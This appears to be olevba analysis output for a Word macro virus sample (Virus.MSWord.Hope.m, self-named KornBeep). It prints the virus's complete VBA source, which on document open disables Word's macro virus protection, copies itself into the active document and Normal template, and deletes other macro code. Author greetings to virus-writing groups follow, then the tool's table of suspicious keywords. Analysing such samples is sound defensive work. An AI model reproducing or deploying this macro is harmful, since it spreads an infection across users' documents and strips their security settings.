olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hope.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hope.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): If Options.VirusProtection <> 0 Then Options.VirusProtection = 0 Else If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines = 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString MacroContainer.VBProject.VBComponents.Item(1).CodeModule.lines(1, 2) Else If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines = 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString MacroContainer.VBProject.VBComponents.Item(1).CodeModule.lines(1, 2) Else If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines <> 2 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.deletelines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.countoflines Else If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines <> 2 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.deletelines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.countoflines Else Beep
End Sub 'w97m/KornBeep v2.0d fri aug 13 99 [SWL/LZ0/DVC] special thanks 2 slage hammer and jacktwoflower for this contest; helo 2 skammy my partner but got "shut down", the might 4 including me in dvc, iman urtcele 4 helping me with v1.7-2.0, virus buster, lys kovick, mkvg, virtual life, trevelyan, Raid, Knowdeth; members of skamwerks, linezer0, and dvc; respects 2 the codebreakers, avm, tnn, slam, 29a... =)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|virtual             |May detect virtualization                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

